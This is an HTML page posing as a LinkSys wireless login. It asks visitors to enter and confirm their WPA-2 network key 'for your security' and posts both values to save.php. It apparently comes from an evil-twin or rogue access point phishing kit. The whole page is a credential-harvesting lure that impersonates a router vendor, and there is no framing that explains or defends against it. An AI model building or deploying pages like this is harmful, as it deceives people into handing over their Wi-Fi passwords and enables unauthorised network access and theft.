<html>
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
		<title>LinkSys Login</title>
		<link rel="stylesheet" type="text/css" href="./include/style.css" />
		<link rel="SHORTCUT ICON" href="./images/favicon.ico" />
	</head>
<body class="login-background grad">
	<div class="login-container" id="login-container">
		<div id="login-page-links" align="center">
			<img class="login-logo" src="./images/logo.png"></img>
			<div class="login-text-area">
				<span class="login-large-text">Wireless Network</span>
				<br>
			</div>
		</div>
		<span class = "login-small-text">For your security, enter your <strong>WPA-2 Key</strong> in order to access the internet. </span>
		<form id="form1" name="form1" method="post" action="save.php">
			<div class="login-hint-form-field">
				<div class="login-id">
					<input class="new-login-text" spellcheck="false" size="45" id="key1" name="key1" type="password" tabindex=1 placeholder="WPA-2 Key" onfocus="this.placeholder = ''" onblur="this.placeholder = 'WPA-2 Key'">
				</div>
			</div>
			<div class="login-hint-form-field">
				<div>
					<input class="new-login-text" size="45" id="key2" name="key2" type="password" tabindex=2 placeholder="WPA-2 Key (confirm)" onfocus="this.placeholder = ''" onblur="this.placeholder = 'WPA-2 Key (confirm)'">
				</div>
			</div>
			<input class="loginButton" type="submit" id="saveAndSubmit" name="saveAndSubmit" value="Submit" alt="Submit">
		</form>
